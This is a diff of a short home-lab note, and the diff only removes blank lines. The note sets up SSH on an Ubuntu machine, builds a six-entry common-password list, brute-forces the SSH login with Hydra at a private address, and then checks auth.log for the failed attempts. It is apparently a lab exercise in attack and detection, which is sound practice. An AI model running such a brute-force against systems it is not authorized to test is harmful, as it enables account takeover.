@@ -1,21 +1,16 @@
 Setup
 
-
 Enable SSH on Ubuntu:
 sudo apt update sudo apt install -y openssh-server sudo systemctl enable --now ssh
-
 
 Install Hydra:
 sudo apt update sudo apt install -y hydra
 
-
 Create small password list:
 printf "123456\npassword\nqwerty\nadmin\nletmein\nkali\n" > pass.txt
 
-
 Run brute-force:
 hydra -l <ubuntu_user> -P pass.txt -t 8 -V ssh://192.168.68.128
-
 
 Verify logs on Ubuntu:
 sudo grep "Failed password" /var/log/auth.log | tail -n 30
